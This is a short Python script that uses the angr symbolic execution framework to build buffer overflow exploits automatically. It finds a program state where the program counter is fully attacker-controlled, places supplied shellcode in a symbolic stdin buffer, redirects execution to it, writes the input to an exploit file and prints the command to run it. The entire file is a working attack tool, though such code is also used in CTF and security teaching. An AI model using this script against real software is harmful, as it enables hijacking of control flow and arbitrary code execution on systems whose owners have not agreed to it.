import os
import sys
import angr
import subprocess
import logging
from angr import sim_options as so

def fully_symbolic(state, variable):
    for i in range(state.arch.bits):
        if not state.solver.symbolic(variable[i]):
            return False
    return True

def check_continuity(address, addresses, length):
    for i in range(length):
        if not address + i in addresses:
            return False

    return True

def find_symbolic_buffer(state, length):
    stdin = state.posix.stdin
    sym_addrs = [ ]
    for _, symbol in state.solver.get_variables('file', stdin.ident):
        sym_addrs.extend(state.memory.addrs_for_name(next(iter(symbol.variables))))
    for addr in sym_addrs:
        if check_continuity(addr, sym_addrs, length):
            yield addr

def OverFlow(binary,shellcode):
    p = angr.Project(binary)
    binary_name = os.path.basename(binary)
    extras = {so.REVERSE_MEMORY_NAME_MAP, so.TRACK_ACTION_HISTORY}
    es = p.factory.entry_state(add_options=extras)
    sm = p.factory.simulation_manager(es, save_unconstrained=True)
    exploitable_state = None
    while exploitable_state is None:
        print(sm)
        sm.step()
        if len(sm.unconstrained) > 0:
            for u in sm.unconstrained:
                if fully_symbolic(u, u.regs.pc):
                    exploitable_state = u
                    break
            sm.drop(stash='unconstrained')
    ep = exploitable_state

    assert ep.solver.symbolic(ep.regs.pc), "PC must be symbolic at this point"

    for buf_addr in find_symbolic_buffer(ep, len(shellcode)):
        memory = ep.memory.load(buf_addr, len(shellcode))
        sc_bvv = ep.solver.BVV(shellcode)

        if ep.satisfiable(extra_constraints=(memory == sc_bvv,ep.regs.pc == buf_addr)):       
            ep.add_constraints(memory == sc_bvv)
            ep.add_constraints(ep.regs.pc == buf_addr)
            break
    else:
        return 1

    filename = '%s-exploit' % binary_name
    with open(filename, 'wb') as f:
        f.write(ep.posix.dumps(0))

    print("%s exploit in %s" % (binary_name, filename))
    print("run with `(cat %s; cat -) | %s`" % (filename, binary))
    return 0